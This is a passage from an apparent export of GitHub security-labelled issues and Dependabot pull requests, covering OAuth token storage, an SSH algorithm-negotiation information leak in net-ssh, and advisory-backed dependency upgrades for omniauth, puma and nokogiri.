http://oauth.net/core/1.0a/#rfc.section.11.6
","If we hash these tokens the same way we do passwords there is no way to get access to them again unless the user re enters them. I'm assuming this isn't what we want?
We could use symmetric key encryption, with the key being the users password and then when the user logs in decrypt the keys ?

How would we decide when to destroy the decrypted keys?
All good questions, and I don't have definite answers top of mind. Let's discuss on the dev mailing list so everyone can participate.
The user's password probably isn't the best as idea as those change semi-frequently

A common approach is to go with the blowfish cbc encryption algorithm wherein the person installing the application decides the single key for the entirety of encrypted data for all users, saves it in the config file or elsewhere, then that key is used for all encryption/decryption.  As the encrypted data is in binary then a final step is usually used of base64 encoding to make it ascii before storing the encoded data anywhere.

This encryption is handled PHP's mcrypt library which connects to an underlaying C library - neither may be installed so this would probably have to be an optional feature.

examples:
http://www.php.net/manual/en/function.mcrypt-encrypt.php#44728
http://www.chilkatsoft.com/p/php_blowfish.asp
",no,"security,"
net-ssh/net-ssh,937912475,"Security Issue - Observable Discrepancy leading to an information leak in the algorithm negotiation","net-ssh has an Observable Discrepancy leading to an information leak in the algorithm negotiation. This allows man-in-the-middle attackers to target initial connection attempts (where no host key for the server has been cached by the client). 

This vulnerability allows a man in the middle attack to determine, if a client already has prior knowledge of the remote hosts fingerprint.

Using this information leak it is possible to ignore clients, which will show an error message during an man in the middle attack, while new clients can be intercepted without alerting them of the man in the middle attack.

This is the same vulnerability like in [OpenSSH](https://docs.ssh-mitm.at/CVE-2020-14145.html) and [PuTTY](https://docs.ssh-mitm.at/CVE-2020-14002.html).

Example known host fingerprint:

```
['ssh-rsa', 'ssh-ed25519-cert-v01@openssh.com', 'ssh-ed25519', 'ecdsa-sha2-nistp521-cert-v01@openssh.com', 'ecdsa-sha2-nistp384-cert-v01@openssh.com', 'ecdsa-sha2-nistp256-cert-v01@openssh.com', 'ecdsa-sha2-nistp521', 'ecdsa-sha2-nistp384', 'ecdsa-sha2-nistp256', 'ssh-rsa-cert-v01@openssh.com', 'ssh-rsa-cert-v00@openssh.com', 'ssh-dss']
```

Without known fingerprint:

```
['ssh-ed25519-cert-v01@openssh.com', 'ssh-ed25519', 'ecdsa-sha2-nistp521-cert-v01@openssh.com', 'ecdsa-sha2-nistp384-cert-v01@openssh.com', 'ecdsa-sha2-nistp256-cert-v01@openssh.com', 'ecdsa-sha2-nistp521', 'ecdsa-sha2-nistp384', 'ecdsa-sha2-nistp256', 'ssh-rsa-cert-v01@openssh.com', 'ssh-rsa-cert-v00@openssh.com', 'ssh-rsa', 'ssh-dss']
```
",,no,"security,"
thoughtbot/upcase,853411824,"[Security] Bump omniauth from 1.9.1 to 2.0.4","Bumps [omniauth](https://github.com/omniauth/omniauth) from 1.9.1 to 2.0.4. **This update includes a security fix.**
<details>
<summary>Vulnerabilities fixed</summary>
<p><em>Sourced from <a href=""https://github.com/rubysec/ruby-advisory-db/blob/master/gems/omniauth/CVE-2015-9284.yml"">The Ruby Advisory Database</a>.</em></p>
<blockquote>
<p><strong>CSRF vulnerability in OmniAuth's request phase</strong>
The request phase of the OmniAuth Ruby gem is vulnerable to Cross-Site
Request Forgery (CSRF) when used as part of the Ruby on Rails framework, allowing
accounts to be connected without user intent, user interaction, or feedback to
the user. This permits a secondary account to be able to sign into the web
application as the primary account.</p>
<p>In order to mitigate this vulnerability, Rails users should consider using the
<code>omniauth-rails_csrf_protection</code> gem.</p>
<p>More info is available here: <a href=""https://github.com/omniauth/omniauth/wiki/Resolving-CVE-2015-9284"">https://github.com/omniauth/omniauth/wiki/Resolving-CVE-2015-9284</a></p>
<p>Patched versions: &gt;= 2.0.0
Unaffected versions: none</p>
</blockquote>
</details>
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href=""https://github.com/omniauth/omniauth/releases"">omniauth's releases</a>.</em></p>
<blockquote>
<h2>v2.0.4</h2>
<p>This release removes unnecessary warning logging when accessing GET routes that are not related to the OmniAuth request path.</p>
<p>Thanks to <a href=""https://github.com/charlie-wasp""><code>@charlie-wasp</code></a> and <a href=""https://github.com/sponomarev""><code>@sponomarev</code></a> at <a href=""https://github.com/evilmartians"">Evil Martians</a> for the bug find and subsequent PR.</p>
<h2>Fix rescuing of application errors when call_app! is used.</h2>
<p>As a consequence of the changes that were merged in <a href=""https://github-redirect.dependabot.com/omniauth/omniauth/issues/689"">#689</a>, errors
thrown by strategies that utilize other_phase (or more specifically
call_app!), would be caught by omniauth, causing headaches for folks
looking to have those errors handled by their application. This
should allow for errors that come from the app to pass through, while
passing errors that come from the authentication phases to the fail!
handler.</p>
<p>Resolves <a href=""https://github-redirect.dependabot.com/omniauth/omniauth/issues/1030"">#1030</a></p>
<h2>Fix for incorrect order of request_validation_phase in test_mode.</h2>
<p><a href=""https://github.com/jsdalton""><code>@jsdalton</code></a> gave an awesome report of the issue present in test_mode in <a href=""https://github-redirect.dependabot.com/omniauth/omniauth/issues/1033"">#1033</a></p>
<blockquote>
<p>The current implementation of mock_call was verifying the token for all requests, regardless of whether the current path is on the omniauth request path. The change was introduced recently in 1b784ff. See <a href=""https://github-redirect.dependabot.com/omniauth/omniauth/issues/1032"">#1032</a> for details.</p>
<p>This creates two problems:</p>
<ol>
<li>When test mode is on, the authenticity verification logic is run inappropriately against requests where this may not even be wanted.</li>
<li>The behavior varies from actual production behavior, potentially allowing bugs to be introduced by unwary developers.</li>
</ol>
</blockquote>
<p>Note that this bug was only present when OmniAuth was configured for test_mode and using the mock_call phases.</p>
<h2>Allow passing rack-protection configuration to default request_validation_phase</h2>
<p>This release now properly allows an instance of OmniAuth::AuthenticityTokenProtection (with passed in rack-protection configuration) to be used as the request_validation_phase.</p>
<p>Thanks <a href=""https://github.com/jkowens""><code>@jkowens</code></a> <a href=""https://github-redirect.dependabot.com/omniauth/omniauth/pull/1027"">#1027</a></p>
<p>If you haven't already read the <a href=""https://github.com/omniauth/omniauth/releases/tag/v2.0.0"">release notes</a> for v2.0.0, you should do so.</p>
<h2>v2.0.0</h2>
<p>Version 2.0 of OmniAuth includes some changes that may be breaking depending on how you use OmniAuth in your app.</p>
<p>Many thanks to the folks who contributed in code and discussion for these changes.</p>
<h2><strong>OmniAuth now defaults to only POST as the allowed request_phase method.</strong></h2>
<p>Hopefully, you were already doing this as a result of the warnings due to <a href=""https://nvd.nist.gov/vuln/detail/CVE-2015-9284"">CVE-2015-9284</a>.<br />
For detailed context, see:<br />
<a href=""https://github-redirect.dependabot.com/omniauth/omniauth/issues/960"">#960</a><br />
<a href=""https://github-redirect.dependabot.com/omniauth/omniauth/pull/809"">#809</a><br />
<a href=""https://github.com/omniauth/omniauth/wiki/Resolving-CVE-2015-9284"">Resolving CVE-2015-9284</a></p>
<p>This change also includes an additional configurable phase: <code>request_validation_phase</code>.</p>
<h3>Rack/Sinatra</h3>
<p>By default, this uses rack-protection's <a href=""https://github.com/sinatra/sinatra/tree/master/rack-protection"">AuthenticityToken</a> class to validate authenticity tokens. If you are using a rack based framework like sinatra, you can find an example of how to add authenticity tokens to your view <a href=""https://github.com/BobbyMcWho/omniauth_2_examples/blob/main/sinatra_app.ru#L18-L21"">here</a>.</p>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/omniauth/omniauth/commit/e7b8811e5bde85cf193192cd4b90e8cefd821f9f""><code>e7b8811</code></a> Release v2.0.4</li>
<li><a href=""https://github.com/omniauth/omniauth/commit/119a54d7fb3808276adcdc735bf04f7d5dbc1951""><code>119a54d</code></a> Remove jruby-head for now</li>
<li><a href=""https://github.com/omniauth/omniauth/commit/f0e5d42290c6e9f2dbdeb7a8036e96c2f16d2990""><code>f0e5d42</code></a> Merge pull request <a href=""https://github-redirect.dependabot.com/omniauth/omniauth/issues/1041"">#1041</a> from charlie-wasp/fix/get-request-warning</li>
<li><a href=""https://github.com/omniauth/omniauth/commit/b72a8db667960ae1a930d0df4f5e5917dcd0ad7a""><code>b72a8db</code></a> Warn only on GET requests for login path</li>
<li><a href=""https://github.com/omniauth/omniauth/commit/481e30734762dbd7ac0d54593b0bc34982cb2ae1""><code>481e307</code></a> Prepare for next development iteration</li>
<li><a href=""https://github.com/omniauth/omniauth/commit/f9dddef38831440b49d3d38a0e6b1e87cc4dca2b""><code>f9dddef</code></a> v2.0.3 release</li>
<li><a href=""https://github.com/omniauth/omniauth/commit/7e1b49fc665827dcbc8fde12aa624357968a4f6a""><code>7e1b49f</code></a> Merge pull request <a href=""https://github-redirect.dependabot.com/omniauth/omniauth/issues/1035"">#1035</a> from omniauth/1030-standard-error-handling</li>
<li><a href=""https://github.com/omniauth/omniauth/commit/6f4cdb08f4741a0b3c83dfafd5f93e972be97c0e""><code>6f4cdb0</code></a> Better handle errors that come from the actual app.</li>
<li><a href=""https://github.com/omniauth/omniauth/commit/0d533c3615f7c54fa2b64d160fe7943c6fc52f78""><code>0d533c3</code></a> Update README for next dev cycle.</li>
<li><a href=""https://github.com/omniauth/omniauth/commit/ba115e1ac2c0364a8377c64946571c97f4b31cca""><code>ba115e1</code></a> Prepare for 2.0.2 release</li>
<li>Additional commits viewable in <a href=""https://github.com/omniauth/omniauth/compare/v1.9.1...v2.0.4"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=omniauth&package-manager=bundler&previous-version=1.9.1&new-version=2.0.4)](https://dependabot.com/compatibility-score/?dependency-name=omniauth&package-manager=bundler&previous-version=1.9.1&new-version=2.0.4)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Automerge options (never/patch/minor, and dev/runtime dependencies)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>",,yes,"dependencies,security,"
thoughtbot/upcase,893856922,"[Security] Bump puma from 5.1.1 to 5.3.1","Bumps [puma](https://github.com/puma/puma) from 5.1.1 to 5.3.1. **This update includes a security fix.**
<details>
<summary>Vulnerabilities fixed</summary>
<p><em>Sourced from <a href=""https://github.com/advisories/GHSA-q28m-8xjw-8vr5"">The GitHub Security Advisory Database</a>.</em></p>
<blockquote>
<p><strong>Keepalive Connections Causing Denial Of Service in puma</strong>
This vulnerability is related to <a href=""https://github.com/puma/puma/security/advisories/GHSA-7xx3-m584-x994"">CVE-2019-16770</a>.</p>
<h3>Impact</h3>
<p>The fix for CVE-2019-16770 was incomplete. The original fix only protected existing connections that had already been accepted from having their requests starved by greedy persistent-connections saturating all threads in the same process. However, new connections may still be starved by greedy persistent-connections saturating all threads in all processes in the cluster.</p>
<p>A <code>puma</code> server which received more concurrent <code>keep-alive</code> connections than the server had threads in its threadpool would service only a subset of connections, denying service to the unserved connections.</p>
<h3>Patches</h3>
<p>This problem has been fixed in <code>puma</code> 4.3.8 and 5.3.1.</p>
<h3>Workarounds</h3>
<p>Setting <code>queue_requests false</code> also fixes the issue. This is not advised when using <code>puma</code> without a reverse proxy, such as <code>nginx</code> or <code>apache</code>, because you will open yourself to slow client attacks (e.g. <a href=""https://en.wikipedia.org/wiki/Slowloris_(computer_security)"">slowloris</a>).</p>
<p>The fix is very small. <a href=""https://gist.github.com/nateberkopec/4b3ea5676c0d70cbb37c82d54be25837"">A git patch is available here</a> for those using <a href=""https://github.com/puma/puma/security/policy#supported-versions"">unsupported versions</a> of Puma.</p>
<h3>For more information</h3>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
<blockquote>
<p>Affected versions: &gt;= 5.0.0, &lt;= 5.3.0</p>
</blockquote>
</details>
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href=""https://github.com/puma/puma/releases"">puma's releases</a>.</em></p>
<blockquote>
<h2>5.3.1</h2>
<ul>
<li>Security
<ul>
<li>Close keepalive connections after the maximum number of fast inlined requests (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2625"">#2625</a>)</li>
</ul>
</li>
</ul>
<h2>5.3.0 - Sweetnighter</h2>
<h2>5.3.0 / 2021-05-07</h2>
<p><img src=""https://upload.wikimedia.org/wikipedia/en/3/36/WRsweetnighter.jpg"" alt="""" /></p>
<p>Contributor <a href=""https://github.com/MSP-Greg""><code>@â€‹MSP-Greg</code></a> codenamed this release &quot;Sweetnighter&quot;.</p>
<ul>
<li>
<p>Features</p>
<ul>
<li>Add support for Linux's abstract sockets (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2564"">#2564</a>, <a href=""https://github-redirect.dependabot.com/puma/puma/issues/2526"">#2526</a>)</li>
<li>Add debug to worker timeout and startup (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2559"">#2559</a>, <a href=""https://github-redirect.dependabot.com/puma/puma/issues/2528"">#2528</a>)</li>
<li>Print warning when running one-worker cluster (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2565"">#2565</a>, <a href=""https://github-redirect.dependabot.com/puma/puma/issues/2534"">#2534</a>)</li>
<li>Don't close systemd activated socket on pumactl restart (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2563"">#2563</a>, <a href=""https://github-redirect.dependabot.com/puma/puma/issues/2504"">#2504</a>)</li>
</ul>
</li>
<li>
<p>Bugfixes</p>
<ul>
<li>systemd - fix event firing (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2591"">#2591</a>, <a href=""https://github-redirect.dependabot.com/puma/puma/issues/2572"">#2572</a>)</li>
<li>Immediately unlink temporary files (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2613"">#2613</a>)</li>
<li>Improve parsing of HTTP_HOST header (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2605"">#2605</a>, <a href=""https://github-redirect.dependabot.com/puma/puma/issues/2584"">#2584</a>)</li>
<li>Handle fatal error that has no backtrace (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2607"">#2607</a>, <a href=""https://github-redirect.dependabot.com/puma/puma/issues/2552"">#2552</a>)</li>
<li>Fix timing out requests too early (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2606"">#2606</a>, <a href=""https://github-redirect.dependabot.com/puma/puma/issues/2574"">#2574</a>)</li>
<li>Handle segfault in Ruby 2.6.6 on thread-locals (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2567"">#2567</a>, <a href=""https://github-redirect.dependabot.com/puma/puma/issues/2566"">#2566</a>)</li>
<li>Server#closed_socket? - parameter may be a MiniSSL::Socket (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2596"">#2596</a>)</li>
<li>Define UNPACK_TCP_STATE_FROM_TCP_INFO in the right place (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2588"">#2588</a>, <a href=""https://github-redirect.dependabot.com/puma/puma/issues/2556"">#2556</a>)</li>
<li>request.rb - fix chunked assembly for ascii incompatible encodings, add test (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2585"">#2585</a>, <a href=""https://github-redirect.dependabot.com/puma/puma/issues/2583"">#2583</a>)</li>
</ul>
</li>
<li>
<p>Performance</p>
<ul>
<li>Reset peerip only if remote_addr_header is set (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2609"">#2609</a>)</li>
<li>Reduce puma_parser struct size (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2590"">#2590</a>)</li>
</ul>
</li>
<li>
<p>Refactor</p>
<ul>
<li>Refactor drain on shutdown (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2600"">#2600</a>)</li>
<li>Micro optimisations in <code>wait_for_less_busy_worker</code> feature (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2579"">#2579</a>)</li>
<li>Lots of test fixes</li>
</ul>
</li>
</ul>
<h2>5.2.2</h2>
<ul>
<li>Bugfixes
<ul>
<li>Add <code>#flush</code> and <code>#sync</code> methods to <code>Puma::NullIO</code>  (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2553"">#2553</a>)</li>
<li>Restore <code>sync=true</code> on <code>STDOUT</code> and <code>STDERR</code> streams (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2557"">#2557</a>)</li>
</ul>
</li>
</ul>
<h2>5.2.1</h2>
<h2>2021-02-05</h2>
<ul>
<li>Bugfixes
<ul>
<li>Fix TCP cork/uncork operations to work with ssl clients (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2550"">#2550</a>)</li>
<li>Require rack/common_logger explicitly if :verbose is true (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2547"">#2547</a>)</li>
<li>MiniSSL::Socket#write - use data.byteslice(wrote..-1) (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2543"">#2543</a>)</li>
<li>Set <code>@env[CONTENT_LENGTH]</code> value as string. (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2549"">#2549</a>)</li>
</ul>
</li>
</ul>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
</details>
<details>
<summary>Changelog</summary>
<p><em>Sourced from <a href=""https://github.com/puma/puma/blob/master/History.md"">puma's changelog</a>.</em></p>
<blockquote>
<h2>5.3.1 / 2021-05-11</h2>
<ul>
<li>Security
<ul>
<li>Close keepalive connections after the maximum number of fast inlined requests (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2625"">#2625</a>)</li>
</ul>
</li>
</ul>
<h2>5.3.0 / 2021-05-07</h2>
<ul>
<li>
<p>Features</p>
<ul>
<li>Add support for Linux's abstract sockets (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2564"">#2564</a>, <a href=""https://github-redirect.dependabot.com/puma/puma/issues/2526"">#2526</a>)</li>
<li>Add debug to worker timeout and startup (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2559"">#2559</a>, <a href=""https://github-redirect.dependabot.com/puma/puma/issues/2528"">#2528</a>)</li>
<li>Print warning when running one-worker cluster (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2565"">#2565</a>, <a href=""https://github-redirect.dependabot.com/puma/puma/issues/2534"">#2534</a>)</li>
<li>Don't close systemd activated socket on pumactl restart (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2563"">#2563</a>, <a href=""https://github-redirect.dependabot.com/puma/puma/issues/2504"">#2504</a>)</li>
</ul>
</li>
<li>
<p>Bugfixes</p>
<ul>
<li>systemd - fix event firing (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2591"">#2591</a>, <a href=""https://github-redirect.dependabot.com/puma/puma/issues/2572"">#2572</a>)</li>
<li>Immediately unlink temporary files (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2613"">#2613</a>)</li>
<li>Improve parsing of HTTP_HOST header (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2605"">#2605</a>, <a href=""https://github-redirect.dependabot.com/puma/puma/issues/2584"">#2584</a>)</li>
<li>Handle fatal error that has no backtrace (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2607"">#2607</a>, <a href=""https://github-redirect.dependabot.com/puma/puma/issues/2552"">#2552</a>)</li>
<li>Fix timing out requests too early (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2606"">#2606</a>, <a href=""https://github-redirect.dependabot.com/puma/puma/issues/2574"">#2574</a>)</li>
<li>Handle segfault in Ruby 2.6.6 on thread-locals (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2567"">#2567</a>, <a href=""https://github-redirect.dependabot.com/puma/puma/issues/2566"">#2566</a>)</li>
<li>Server#closed_socket? - parameter may be a MiniSSL::Socket (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2596"">#2596</a>)</li>
<li>Define UNPACK_TCP_STATE_FROM_TCP_INFO in the right place (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2588"">#2588</a>, <a href=""https://github-redirect.dependabot.com/puma/puma/issues/2556"">#2556</a>)</li>
<li>request.rb - fix chunked assembly for ascii incompatible encodings, add test (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2585"">#2585</a>, <a href=""https://github-redirect.dependabot.com/puma/puma/issues/2583"">#2583</a>)</li>
</ul>
</li>
<li>
<p>Performance</p>
<ul>
<li>Reset peerip only if remote_addr_header is set (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2609"">#2609</a>)</li>
<li>Reduce puma_parser struct size (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2590"">#2590</a>)</li>
</ul>
</li>
<li>
<p>Refactor</p>
<ul>
<li>Refactor drain on shutdown (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2600"">#2600</a>)</li>
<li>Micro optimisations in <code>wait_for_less_busy_worker</code> feature (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2579"">#2579</a>)</li>
<li>Lots of test fixes</li>
</ul>
</li>
</ul>
<h2>5.2.2 / 2021-02-22</h2>
<ul>
<li>Bugfixes
<ul>
<li>Add <code>#flush</code> and <code>#sync</code> methods to <code>Puma::NullIO</code>  (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2553"">#2553</a>)</li>
<li>Restore <code>sync=true</code> on <code>STDOUT</code> and <code>STDERR</code> streams (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2557"">#2557</a>)</li>
</ul>
</li>
</ul>
<h2>5.2.1 / 2021-02-05</h2>
<ul>
<li>Bugfixes
<ul>
<li>Fix TCP cork/uncork operations to work with ssl clients (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2550"">#2550</a>)</li>
<li>Require rack/common_logger explicitly if :verbose is true (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2547"">#2547</a>)</li>
<li>MiniSSL::Socket#write - use data.byteslice(wrote..-1) (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2543"">#2543</a>)</li>
<li>Set <code>@env[CONTENT_LENGTH]</code> value as string. (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2549"">#2549</a>)</li>
</ul>
</li>
</ul>
<h2>5.2.0 / 2021-01-27</h2>
<ul>
<li>Features</li>
</ul>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/puma/puma/commit/1c91a4f1af23328118dbfe5b615f812af5e817ef""><code>1c91a4f</code></a> 5.3.1</li>
<li><a href=""https://github.com/puma/puma/commit/6b4a68ab9b4604e44471201d688a5ee876b1bb8a""><code>6b4a68a</code></a> 4.3.8 release note</li>
<li><a href=""https://github.com/puma/puma/commit/df72887170c7ef3614c941c9bdefb4a1f3546ebf""><code>df72887</code></a> Close keepalive connections after MAX_FAST_INLINE requests</li>
<li><a href=""https://github.com/puma/puma/commit/6dfb8bc2ba1175198f5982cc8092bcb7f021fe22""><code>6dfb8bc</code></a> 5.3.0 history (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2622"">#2622</a>)</li>
<li><a href=""https://github.com/puma/puma/commit/fb713236a14b8bd338b690b3cb42afb4eee5f20e""><code>fb71323</code></a> Ignore DS_Store</li>
<li><a href=""https://github.com/puma/puma/commit/f7a2d4eedc6c3ac8069b05a5ce48fcf11bc525ef""><code>f7a2d4e</code></a> systemd - fix event firing (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2591"">#2591</a>)</li>
<li><a href=""https://github.com/puma/puma/commit/2654f02accb8ffb8a722f480c898715aa8d0b16d""><code>2654f02</code></a> Bump version to 5.3.0 [ci skip] (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2616"">#2616</a>)</li>
<li><a href=""https://github.com/puma/puma/commit/cc1768e122d1583c884bc0cf9b8699aa7393bbac""><code>cc1768e</code></a> Few documentations fixes. [ci skip] [changelog skip] (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2619"">#2619</a>)</li>
<li><a href=""https://github.com/puma/puma/commit/ff17194228315fac74e0c9595c4bb89b38aad3f2""><code>ff17194</code></a> Refactor drain on shutdown (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2600"">#2600</a>)</li>
<li><a href=""https://github.com/puma/puma/commit/3e80f7c704e5585da4faa32edf0fa7a0abed3689""><code>3e80f7c</code></a> fix some spell errors (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2615"">#2615</a>)</li>
<li>Additional commits viewable in <a href=""https://github.com/puma/puma/compare/v5.1.1...v5.3.1"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=puma&package-manager=bundler&previous-version=5.1.1&new-version=5.3.1)](https://dependabot.com/compatibility-score/?dependency-name=puma&package-manager=bundler&previous-version=5.1.1&new-version=5.3.1)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Automerge options (never/patch/minor, and dev/runtime dependencies)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>",,yes,"dependencies,security,"
thoughtbot/upcase,893728143,"[Security] Bump nokogiri from 1.10.10 to 1.11.4","Bumps [nokogiri](https://github.com/sparklemotion/nokogiri) from 1.10.10 to 1.11.4. **This update includes security fixes.**
<details>
<summary>Vulnerabilities fixed</summary>
<p><em>Sourced from <a href=""https://github.com/advisories/GHSA-vr8q-g5c7-m54m"">The GitHub Security Advisory Database</a>.</em></p>
<blockquote>
<p><strong>XXE in Nokogiri</strong></p>
<h3>Severity</h3>
<p>Nokogiri maintainers have evaluated this as <a href=""https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:H/PR:L/UI:R/S:U/C:L/I:N/A:N""><strong>Low Severity</strong> (CVSS3 2.6)</a>.</p>
<h3>Description</h3>
<p>In Nokogiri versions &lt;= 1.11.0.rc3, XML Schemas parsed by <code>Nokogiri::XML::Schema</code> are <strong>trusted</strong> by default, allowing external resources to be accessed over the network, potentially enabling XXE or SSRF attacks.</p>
<p>This behavior is counter to the security policy followed by Nokogiri maintainers, which is to treat all input as <strong>untrusted</strong> by default whenever possible.</p>
<p>Please note that this security fix was pushed into a new minor version, 1.11.x, rather than a patch release to the 1.10.x branch, because it is a breaking change for some schemas and the risk was assessed to be &quot;Low Severity&quot;.</p>
<h3>Affected Versions</h3>
<p>Nokogiri <code>&amp;lt;= 1.10.10</code> as well as prereleases <code>1.11.0.rc1</code>, <code>1.11.0.rc2</code>, and <code>1.11.0.rc3</code></p>
<h3>Mitigation</h3>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
<blockquote>
<p>Affected versions: &lt;= 1.10.10</p>
</blockquote>
<p><em>Sourced from <a href=""https://github.com/rubysec/ruby-advisory-db/blob/master/gems/nokogiri/CVE-2020-26247.yml"">The Ruby Advisory Database</a>.</em></p>
<blockquote>
<p><strong>Nokogiri::XML::Schema trusts input by default, exposing risk of an XXE vulnerability</strong></p>
<h3>Description</h3>
<p>In Nokogiri versions &lt;= 1.11.0.rc3, XML Schemas parsed by <code>Nokogiri::XML::Schema</code>
are <strong>trusted</strong> by default, allowing external resources to be accessed over the
network, potentially enabling XXE or SSRF attacks.</p>
<p>This behavior is counter to
